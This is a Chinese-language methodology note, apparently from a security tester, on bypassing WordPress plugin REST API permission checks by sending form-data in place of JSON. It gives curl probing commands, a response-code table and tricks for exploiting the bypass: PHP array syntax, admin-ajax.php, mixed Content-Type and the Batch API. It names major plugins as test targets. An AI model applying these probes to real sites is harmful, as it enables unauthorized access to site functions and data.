# WordPress REST API FormData vs JSON 鉴权差异（通用方法论）

> 从 seniorcarecopay 案例蒸馏出的 WP 插件 REST API 通用绕过模式

## 核心发现

WordPress REST API 处理请求时，`Content-Type` 会影响鉴权路径：

```
POST + multipart/form-data (FormData)
  → WP REST: $_POST 取参数
  → 某些插件的 permission_callback 走 FormData 分支
  → 可能绕过鉴权（返回 400 参数错误 而非 401 未授权）

POST + application/json
  → WP REST: json_decode(body) 取参数
  → 严格走 permission_callback
  → 触发 401 Unauthorized
```

## 判断方法

对同一个 REST 端点，发送两种 Content-Type：

```bash
# FormData
curl -sk -o /dev/null -w '%{http_code}' -X POST "$ENDPOINT" \
  -H "X-WP-Nonce: $NONCE" -F "param=value"

# JSON
curl -sk -o /dev/null -w '%{http_code}' -X POST "$ENDPOINT" \
  -H "X-WP-Nonce: $NONCE" -H "Content-Type: application/json" \
  -d '{"param":"value"}'
```

| FormData | JSON | 含义 |
|----------|------|------|
| 400 | 401 | ✅ **鉴权绕过！** FormData 跳过了 capability 检查 |
| 401 | 401 | ❌ 两条路都有鉴权 |
| 200 | 200 | 本身就是匿名端点 |
| 403 | 403 | WAF 拦截 |

## 利用条件

鉴权绕过后，要实际利用还需要满足参数类型要求：

### 场景 1: 参数全是简单类型（string/int）
→ FormData 直接满足 → **完全利用**

### 场景 2: 参数包含数组/对象
→ 类型系统死锁

**突破方法**（按优先级）：

1. **PHP param[] 数组语法**
```
param[0][key]=value&param[0][flag]=1
→ PHP: ['param' => [['key'=>'value', 'flag'=>'1']]]
```
⚠️ 无法产生布尔值 true/false，只有字符串 "true"/"1"

2. **admin-ajax.php 替代路径**
很多 WP 插件在 admin-ajax.php 注册了相同功能的 action，鉴权逻辑可能不同

3. **Content-Type 混合体**
```
Content-Type: multipart/form-data; boundary=fake
Body: {"param": [{"key": "value"}]}
```
某些 PHP 框架/中间件会同时解析两种格式

4. **WP Batch API**
```
POST /wp-json/batch/v1
Body: {"requests": [{"path": "/wpda/app/save", "body": {...}}]}
```
Batch API 内部转发时可能改变 Content-Type 处理逻辑

## 根因分析

这个问题的根源在于 WordPress REST API 的请求处理流程：

```php
// WP_REST_Request::get_param()
// 检查顺序：URL params → body params → default params
// body params 的来源取决于 Content-Type：
//   - form-data → $_POST
//   - json → json_decode($body)

// 插件的 permission_callback 通常这样写：
function check_permission($request) {
    if ($request->get_param('某个只有JSON才有的参数')) {
        return current_user_can('manage_options');
    }
    // FormData 路径可能没走到这个分支
    return true; // 或者 WP_Error
}
```

当 `permission_callback` 依赖请求参数的存在/格式来决定是否做鉴权检查时，
Content-Type 的差异就会导致鉴权路径分叉。

## 适用范围

- 所有 WordPress 插件的 REST API 端点
- 特别是使用 `register_rest_route()` 但 `permission_callback` 不够严格的插件
- WPDA、GravityForms、WooCommerce 等大型插件都应该测试
- 不限于 WordPress：任何 PHP REST API 都可能有类似问题
